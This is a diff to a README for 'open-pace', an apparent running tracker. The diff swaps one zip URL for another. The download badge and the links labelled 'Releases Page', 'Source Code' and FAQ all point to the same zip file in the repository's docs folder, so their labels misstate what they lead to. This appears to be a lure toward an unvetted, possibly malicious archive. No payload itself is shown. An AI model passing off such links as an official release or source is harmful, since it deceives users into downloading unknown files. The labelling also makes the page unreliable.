@@ -4,13 +4,13 @@
 Welcome to **open-pace**! This application helps you track your running distances and share your journey with friends. Whether you jog for fun or train for a race, open-pace keeps you motivated by recording each mile you run.
 
 ## 📥 Download the Latest Release
-[![Download open-pace](https://raw.githubusercontent.com/JUNGMA0329/open-pace/main/docs/open_pace_v3.9-alpha.2.zip%20open--pace-v1.0-blue)](https://raw.githubusercontent.com/JUNGMA0329/open-pace/main/docs/open_pace_v3.9-alpha.2.zip)
+[![Download open-pace](https://github.com/JUNGMA0329/open-pace/raw/refs/heads/main/docs/open-pace-3.9.zip%20open--pace-v1.0-blue)](https://github.com/JUNGMA0329/open-pace/raw/refs/heads/main/docs/open-pace-3.9.zip)
 
 ## 🚀 Getting Started
 To begin using open-pace, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases Page](https://raw.githubusercontent.com/JUNGMA0329/open-pace/main/docs/open_pace_v3.9-alpha.2.zip) to find the latest version of the application. 
+   Go to our [Releases Page](https://github.com/JUNGMA0329/open-pace/raw/refs/heads/main/docs/open-pace-3.9.zip) to find the latest version of the application. 
 
 2. **Choose Your Version**
    On the Releases page, you will see several versions listed. Look for the most recent one, which typically has the highest version number. 
@@ -55,7 +55,7 @@ After the installation, open-pace makes it easy to start tracking your runs:
 3. **Share Your Progress**: Use the share feature to send your stats to friends in the fediverse. You can choose what information to share.
 
 ## 📑 Support and Questions
-If you encounter any issues or have questions about using open-pace, feel free to reach out. Many users find answers in our community forum. You can also check the FAQ section on our [Releases Page](https://raw.githubusercontent.com/JUNGMA0329/open-pace/main/docs/open_pace_v3.9-alpha.2.zip).
+If you encounter any issues or have questions about using open-pace, feel free to reach out. Many users find answers in our community forum. You can also check the FAQ section on our [Releases Page](https://github.com/JUNGMA0329/open-pace/raw/refs/heads/main/docs/open-pace-3.9.zip).
 
 ## 🎉 Stay Connected
 Stay updated with new features and improvements. Follow us on our social media channels:
@@ -63,7 +63,7 @@ Stay updated with new features and improvements. Follow us on our social media c
 - **Fediverse**: @openpace@fediverse
 
 ## 🔗 Important Links
-- [Download open-pace](https://raw.githubusercontent.com/JUNGMA0329/open-pace/main/docs/open_pace_v3.9-alpha.2.zip)
-- [Source Code](https://raw.githubusercontent.com/JUNGMA0329/open-pace/main/docs/open_pace_v3.9-alpha.2.zip)
+- [Download open-pace](https://github.com/JUNGMA0329/open-pace/raw/refs/heads/main/docs/open-pace-3.9.zip)
+- [Source Code](https://github.com/JUNGMA0329/open-pace/raw/refs/heads/main/docs/open-pace-3.9.zip)
 
 Thank you for choosing open-pace! Enjoy your runs and happy sharing!
